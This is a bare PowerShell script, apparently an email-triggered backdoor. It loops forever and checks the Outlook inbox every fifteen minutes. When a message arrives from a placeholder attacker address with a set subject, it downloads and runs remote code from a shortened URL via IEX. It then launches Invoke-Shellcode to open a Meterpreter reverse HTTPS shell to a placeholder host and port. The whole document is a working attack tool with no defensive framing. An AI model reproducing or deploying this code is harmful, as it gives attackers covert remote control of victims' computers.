while($true){
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$inbox.items | foreach { 
if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "SPECIFIEDSUBJECT")
{$WebClientObject = New-Object Net.WebClient
IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xx.xx.x.xxx -LPORT 1111 -Force
Return}
  
}

start-sleep -s 900

}


